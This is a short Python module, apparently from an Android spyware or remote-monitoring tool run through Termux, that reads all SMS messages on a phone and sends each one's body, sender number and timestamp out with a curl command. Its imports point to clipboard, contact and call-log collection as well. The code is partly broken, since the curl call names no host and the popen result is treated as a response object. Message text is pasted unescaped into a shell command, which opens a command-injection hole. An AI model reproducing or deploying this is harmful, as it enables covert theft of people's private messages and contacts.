import os,sys,json, time
from .models import call_log, sms_list, clipboard, contact_list, Token

def check_sms(THIS_USER_TOKEN):
    try:
        res = json.loads(os.popen('termux-sms-list').read())
    except:
        raise ('Termux command error!')

    for sms in res:
        if not sms_list.objects.filter(date = sms['received']).exists():
            call_back = os.popen(f'curl --data "token={THIS_USER_TOKEN}&body={sms["body"]}&phone_number={sms["number"]}&type={sms["type"]}&read={bool(str(sms["read"]).capitalize())}&received={sms["received"]}"')
            if call_back['status'] != 200:
                raise ('error, packet doesn\'t send!')

